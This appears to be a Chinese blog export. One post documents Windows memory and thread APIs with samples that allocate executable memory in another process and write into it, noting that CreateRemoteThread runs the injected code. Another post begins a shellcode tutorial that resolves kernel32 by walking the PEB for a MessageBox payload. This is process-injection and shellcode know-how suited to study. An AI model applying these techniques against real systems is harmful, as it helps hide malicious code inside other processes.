<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DECLSPEC_ALLOCATOR HGLOBAL <span class="title">GlobalAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] UINT   uFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T dwBytes</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>uFlags：内存分配属性。如果指定 0，则默认值为GMEM_FIXED。<ul>
<li>GMEM_FIXED：分配固定内存。返回值是一个指针。</li>
<li>GMEM_MOVEABLE：分配可移动内存。内存块不会在物理内存内移动，但可以在默认堆内移动。</li>
<li>GMEM_ZEROINIT：将内存内容初始化为0。</li>
</ul>
</li>
<li>dwBytes：要分配的字节数。</li>
</ul>
<h3 id="CoTaskMemAlloc"><a href="#CoTaskMemAlloc" class="headerlink" title="CoTaskMemAlloc"></a>CoTaskMemAlloc</h3><p>函数在<strong>combaseapi.h</strong>中声明。分配内存块。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">CoTaskMemAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T cb</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>cb：要分配的内存块的大小，以字节为单位。</li>
</ul>
<h3 id="AllocADsMem"><a href="#AllocADsMem" class="headerlink" title="AllocADsMem"></a>AllocADsMem</h3><p>函数在<strong>adshlp.h</strong>中声明。分配指定大小的内存块。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">AllocADsMem</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD cb</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>cb：包含要分配的大小（以字节为单位）。</li>
</ul>
<h2 id="内存拷贝"><a href="#内存拷贝" class="headerlink" title="内存拷贝"></a>内存拷贝</h2><h3 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memcpy</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">void</span> *dest,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">const</span> <span class="type">void</span> *src,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">size_t</span> count</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function"><span class="type">wchar_t</span> *<span class="title">wmemcpy</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">wchar_t</span> *dest,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">const</span> <span class="type">wchar_t</span> *src,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">size_t</span> count</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="CopyMemory"><a href="#CopyMemory" class="headerlink" title="CopyMemory"></a>CopyMemory</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CopyMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_       PVOID  Destination,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_ <span class="type">const</span> VOID   *Source,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_       SIZE_T Length</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="RtlCopyMemory"><a href="#RtlCopyMemory" class="headerlink" title="RtlCopyMemory"></a>RtlCopyMemory</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">RtlCopyMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">void</span>*       Destination,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">const</span> <span class="type">void</span>* Source,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">size_t</span>      Length</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="MoveMemory"><a href="#MoveMemory" class="headerlink" title="MoveMemory"></a>MoveMemory</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MoveMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_       PVOID  Destination,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_ <span class="type">const</span> VOID   *Source,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_       SIZE_T Length</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h3><p>函数在<strong>memoryapi.h</strong>中声明。将数据写入指定进程中可访问的内存区域。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID  lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] SIZE_T  *lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>hProcess：要修改的进程内存的句柄。该句柄必须具有对进程的 PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION 访问权限。</li>
<li>lpBaseAddress：指向写入数据的指定进程中的基地址的指针。</li>
<li>lpBuffer：指向缓冲区的指针，该缓冲区包含要写入指定进程的地址空间中的数据。</li>
<li>nSize：要写入指定进程的字节数。</li>
<li>lpNumberOfBytesWritten：指向变量的指针，该变量接收传输到指定进程的字节数。可为NULL。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> main&#123;	</span><br><span class="line">    <span class="type">char</span> strings[] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE process = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="literal">true</span>, <span class="number">19348</span>);</span><br><span class="line">	<span class="keyword">if</span> (!process) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	LPVOID address = <span class="built_in">VirtualAllocEx</span>(process, <span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (!address) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	BOOL result = <span class="built_in">WriteProcessMemory</span>(process, address, strings, <span class="built_in">strlen</span>(strings), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (result) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;String written to remote process\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(process);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内存修改"><a href="#内存修改" class="headerlink" title="内存修改"></a>内存修改</h2><h3 id="VirtualProtect"><a href="#VirtualProtect" class="headerlink" title="VirtualProtect"></a>VirtualProtect</h3><p>函数在<strong>memoryapi.h</strong>中声明。更改对调用进程的虚拟地址空间中已提交页面区域的保护。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>lpAddress：要更改访问保护属性的页面区域的起始页面的地址。指定区域中的所有页面必须位于使用<strong>MEM_RESERVE</strong>调用VirtualAlloc或VirtualAllocEx函数时分配的同一保留区域内。</li>
<li>dwSize：要更改访问保护属性的区域的大小，以字节为单位。</li>
<li>flNewProtect：内存保护选项。</li>
<li>lpflOldProtect：指向变量的指针，该变量接收指定页面区域中第一页的先前访问保护值。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">	LPVOID address = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">1024</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">	BOOL result = <span class="built_in">VirtualProtect</span>(address, <span class="number">1024</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">if</span> (result) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Edit success\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="VirtualProtectEx"><a href="#VirtualProtectEx" class="headerlink" title="VirtualProtectEx"></a>VirtualProtectEx</h3><p>函数在<strong>memoryapi.h</strong>中声明。更改对指定进程的虚拟地址空间中已提交页面区域的保护。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtectEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>hProcess：要更改其内存保护的进程的句柄。该句柄必须具有<strong>PROCESS_VM_OPERATION</strong>访问权限。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    HANDLE process = <span class="built_in">OpenProcess</span>(PROCESS_VM_OPERATION, <span class="literal">true</span>, <span class="number">19348</span>);</span><br><span class="line">	<span class="keyword">if</span> (!process) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	LPVOID address = <span class="built_in">VirtualAllocEx</span>(process, <span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (!address) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	DWORD oldProtect;</span><br><span class="line">	BOOL result = <span class="built_in">VirtualProtectEx</span>(process, address, <span class="number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">if</span> (result) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Edit success\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="线程操作"><a href="#线程操作" class="headerlink" title="线程操作"></a>线程操作</h2><h3 id="CreateThread"><a href="#CreateThread" class="headerlink" title="CreateThread"></a>CreateThread</h3><p>函数在<strong>processthreadsapi.h</strong>中声明。创建一个线程以在调用进程的虚拟地址空间内执行。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  __drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD                 lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针 ，该结构确定返回的句柄是否可以由子进程继承。如果 lpThreadAttributes为NULL，则句柄不能被继承。</li>
<li>dwStackSize：堆栈的初始大小（以字节为单位）。如果此参数为零，则新线程使用可执行文件的默认大小。</li>
<li>lpStartAddress：指向要由线程执行的应用程序定义的函数的指针。</li>
<li>lpParameter：指向要传递给线程的变量的指针。</li>
<li>dwCreationFlags：控制线程创建的标志。<ul>
<li>0：线程创建后立即运行。</li>
<li>CREATE_SUSPENDED：该线程在挂起状态下创建，直到调用 ResumeThread函数 后才会运行 。</li>
<li>STACK_SIZE_PARAM_IS_A_RESERVATION：dwStackSize参数指定堆栈的初始保留大小。</li>
</ul>
</li>
<li>lpThreadId：指向接收线程标识符的变量的指针。如果此参数为 <strong>NULL</strong>，则不返回线程标识符。</li>
</ul>
<p>来看相关的 ResumeThread函数 ：</p>
<p>减少线程的挂起计数。当挂起计数减至零时，线程的执行将恢复。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">ResumeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE hThread</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>hThread：要重新启动的线程的句柄。此句柄必须具有 THREAD_SUSPEND_RESUME 访问权限。</li>
</ul>
<h3 id="WaitForSingleObject"><a href="#WaitForSingleObject" class="headerlink" title="WaitForSingleObject"></a>WaitForSingleObject</h3><p>函数在<strong>synchapi.h</strong>中定义。等待指定对象处于有信号状态或超时间隔已过。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE hHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>hHandle：对象的句柄。该句柄必须具有 <strong>SYNCHRONIZE</strong> 访问权限。</li>
<li>dwMilliseconds：超时间隔，以毫秒为单位。如果指定了非零值，则该函数将等待，直到对象收到信号或间隔过去。如果dwMilliseconds为零，则如果对象没有收到信号，函数不会进入等待状态；它总是立即返回。如果dwMilliseconds为INFINITE，则仅当对象收到信号时该函数才会返回。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Func</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">while</span> (i &gt;= <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Time: &quot;</span> &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">		i--;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> lpParameter = <span class="number">0</span>;</span><br><span class="line">	HANDLE handle = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Func, &amp;lpParameter, CREATE_SUSPENDED, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">	<span class="built_in">ResumeThread</span>(handle);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(handle, INFINITE);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p>函数在<strong>processthreadsapi.h</strong>中声明。创建一个在另一个进程的虚拟地址空间中运行的线程。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE                 hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T                 dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID                 lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD                  dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPDWORD                lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>hProcess：要在其中创建线程的进程的句柄。该句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。</li>
</ul>
<p>注意需要先向远程进程注入代码，然后再创建远程线程执行。</p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Shellcode编写</title>
    <url>/2024/02/14/Virus%20AV/Shellcode%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<p>本文主要是记录一下自己编写shellcode的过程，实现利用MessageBox弹窗。shellcode是一串与地址无关的二进制代码，因而对于一些地址写定的代码需要做调整，最为突出的就是<strong>函数调用和字符串调用</strong>。</p>
<p>首先是字符串的调用，来看两种不同写法的汇编就明白了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> arry1[] = &#123; <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    00111855  mov         byte ptr [arry1],68h  </span></span><br><span class="line"><span class="comment">    00111859  mov         byte ptr [ebp-0Bh],65h  </span></span><br><span class="line"><span class="comment">    0011185D  mov         byte ptr [ebp-0Ah],6Ch  </span></span><br><span class="line"><span class="comment">    00111861  mov         byte ptr [ebp-9],6Ch  </span></span><br><span class="line"><span class="comment">    00111865  mov         byte ptr [ebp-8],6Fh  </span></span><br><span class="line"><span class="comment">    00111869  mov         byte ptr [ebp-7],0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> arry2[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0011186D  mov         eax,dword ptr [string &quot;hello&quot; (0117B30h)]  </span></span><br><span class="line"><span class="comment">    00111872  mov         dword ptr [arry2],eax  </span></span><br><span class="line"><span class="comment">    00111875  mov         cx,word ptr ds:[117B34h]  </span></span><br><span class="line"><span class="comment">    0011187C  mov         word ptr [ebp-18h],cx</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到第一种写法是将字符串的十六进制写到栈上，与地址是无关的；而第二种写法是从<strong>0117B30h</strong>该地址取字符串，我在x32dbg中调试发现该地址是位于.rodata段上的，因而写到shellcode里面就会出错。</p>
<span id="more"></span>

<p>接着就是大头了，如何实现函数的调用。我们可以使用<strong>LoadLibraryA</strong>和<strong>GetProcAddress</strong>函数实现任意函数的调用，如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span></span><br><span class="line"><span class="params">(WINAPI* MyMessageBoxA)</span><span class="params">(</span></span><br><span class="line"><span class="params">	_In_opt_ HWND hWnd,</span></span><br><span class="line"><span class="params">	_In_opt_ LPCSTR lpText,</span></span><br><span class="line"><span class="params">	_In_opt_ LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">	_In_ UINT uType)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hModule = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	MyMessageBoxA myMessageBoxA = (MyMessageBoxA)GetProcAddress(hModule, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"></span><br><span class="line">	myMessageBoxA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题是<strong>LoadLibraryA</strong>和<strong>GetProcAddress</strong>函数该怎么做到与地址无关？这两个函数是存放在<strong>kernel32.dll</strong>中的，理论上我们只需要获取到该dll的地址，然后自实现一个简易的GetProcAddress获取到这两个关键函数的地址就可以。如何找到kernel32.dll的地址，需要运用到PEB（进程环境块）或者是TEB（线程环境块）来实现。PEB的地址存放在fs:[0x30]中；而TEB的地址存放在fs:[0x18]中，TEB偏移为0x30的地方存放着PEB的地址。所以就有两种方式拿到PEB。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> peb;</span><br><span class="line"></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, fs: [<span class="number">0x30</span>] ;</span><br><span class="line">        mov peb, eax;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, fs: [<span class="number">0x18</span>] ;</span><br><span class="line">        mov eax, [eax + <span class="number">0x30</span>];</span><br><span class="line">        mov peb, eax;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来分析PEB的相关结构体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">    BYTE                          Reserved1[<span class="number">2</span>];</span><br><span class="line">    BYTE                          BeingDebugged;</span><br><span class="line">    BYTE                          Reserved2[<span class="number">1</span>];</span><br><span class="line">    PVOID                         Reserved3[<span class="number">2</span>];</span><br><span class="line">    PPEB_LDR_DATA                 Ldr;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">    PVOID                         Reserved4[<span class="number">3</span>];</span><br><span class="line">    PVOID                         AtlThunkSListPtr;</span><br><span class="line">    PVOID                         Reserved5;</span><br><span class="line">    ULONG                         Reserved6;</span><br><span class="line">    PVOID                         Reserved7;</span><br><span class="line">    ULONG                         Reserved8;</span><br><span class="line">    ULONG                         AtlThunkSListPtr32;</span><br><span class="line">    PVOID                         Reserved9[<span class="number">45</span>];</span><br><span class="line">    BYTE                          Reserved10[<span class="number">96</span>];</span><br><span class="line">    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">    BYTE                          Reserved11[<span class="number">128</span>];</span><br><span class="line">    PVOID                         Reserved12[<span class="number">1</span>];</span><br><span class="line">    ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure>

<p>在这个结构体中，我们需要的是<strong>Ldr</strong>成员，它指向<strong>PPEB_LDR_DATA</strong>结构体，其中包含了有关进程已加载模块的信息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span> &#123;</span></span><br><span class="line">    ULONG Length;                                                           <span class="comment">//0x0</span></span><br><span class="line">    UCHAR Initialized;                                                      <span class="comment">//0x4</span></span><br><span class="line">    VOID* SsHandle;                                                         <span class="comment">//0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InLoadOrderModuleList</span>;</span>                               <span class="comment">//0xc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InMemoryOrderModuleList</span>;</span>                             <span class="comment">//0x14</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InInitializationOrderModuleList</span>;</span>                     <span class="comment">//0x1c</span></span><br><span class="line">    VOID* EntryInProgress;                                                  <span class="comment">//0x24</span></span><br><span class="line">    UCHAR ShutdownInProgress;                                               <span class="comment">//0x28</span></span><br><span class="line">    VOID* ShutdownThreadId;                                                 <span class="comment">//0x2c</span></span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure>

<p>这个结构体提供了三个和模块信息相关的链表，只不过链接的顺序不一样，就拿<strong>InLoadOrderModuleList</strong>链表做分析，继续跟进<strong>LIST_ENTRY</strong>结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>发现是双链表结构体，根据微软官方的解释，结构体中成员实际指向的是<strong>LDR_DATA_TABLE_ENTRY</strong>，这才是我们真正需要的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//0xa8 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InLoadOrderLinks</span>;</span>                                    <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InMemoryOrderLinks</span>;</span>                                  <span class="comment">//0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InInitializationOrderLinks</span>;</span>                          <span class="comment">//0x10</span></span><br><span class="line">    VOID* DllBase;                                                          <span class="comment">//0x18</span></span><br><span class="line">    VOID* EntryPoint;                                                       <span class="comment">//0x1c</span></span><br><span class="line">    ULONG SizeOfImage;                                                      <span class="comment">//0x20</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">FullDllName</span>;</span>                                     <span class="comment">//0x24</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">BaseDllName</span>;</span>                                     <span class="comment">//0x2c</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>其中<strong>FullDllName</strong>和<strong>BaseDllName</strong>记录了模块的名字，<strong>DllBase</strong>记录了模块的加载地址，正是我们需要的。</p>
